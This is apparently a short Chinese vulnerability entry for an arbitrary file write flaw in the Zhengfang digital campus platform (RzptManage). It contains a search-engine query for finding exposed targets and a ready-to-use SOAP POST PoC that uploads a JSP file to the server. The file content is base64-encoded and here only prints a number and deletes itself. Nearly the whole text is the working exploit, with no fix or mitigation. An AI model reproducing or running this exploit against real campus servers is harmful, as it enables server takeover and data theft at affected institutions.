## 正方数字化校园平台RzptManage存在任意文件写入漏洞

正方数字化校园平台RzptManage存在任意文件写入漏洞，攻击者可通过该漏洞获取服务器权限。

## hunter

```
title="正方数字化校园信息门户"||title="数字化校园信息门户"||title="统一身份认证中心"&&body="正方"&&body="zfca/login"&&body="login_bg"
```

## poc

```
POST /zfca/axis/RzptManage HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Content-Length: 808
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: text/xml;charset=UTF-8
SOAPAction: 
Upgrade-Insecure-Requests: 1

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pub="http://pubService.webServices.zfca.zfsoft.com">
   <soapenv:Header/>
   <soapenv:Body>
      <pub:savePic soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <filepath xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">zkimvsrr.jsp</filepath>
         <bytes xsi:type="soapenc:base64Binary" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">PCUgb3V0LnByaW50bG4oMTExKjExMSk7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==</bytes>
      </pub:savePic>
   </soapenv:Body>
</soapenv:Envelope>
```

文件路径`/zfca/zkimvsrr.jsp`